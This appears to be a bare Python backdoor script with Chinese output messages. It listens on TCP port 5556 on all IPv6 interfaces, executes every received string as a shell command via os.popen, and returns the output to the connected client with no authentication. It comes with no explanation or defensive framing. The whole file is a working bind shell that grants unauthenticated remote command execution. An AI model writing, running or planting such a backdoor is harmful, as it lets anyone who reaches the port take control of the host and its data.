import socket, os
import threading


def listen():
    s = socket.socket(socket.AF_INET6)
    s.bind(('::', 5556))
    s.listen()
    chanel, client = s.accept()
    lis_return.append(chanel)


def core():
    thread = threading.Thread(target=listen)
    thread.start()
    thread.join()
    chanel = lis_return[-1]
    while True:
        try:
            command = chanel.recv(10240).decode('utf-8')
            reply = os.popen(command).read().encode('utf-8')
            chanel.send(f'命令{command}输出：\n'.encode('utf-8') + reply)
        except ConnectionAbortedError as e:
            core()
        except Exception as e:
            chanel.send(f'命令出错:{e}'.encode('utf-8'))
            continue


if __name__ == '__main__':
    lis_return = []
    core()
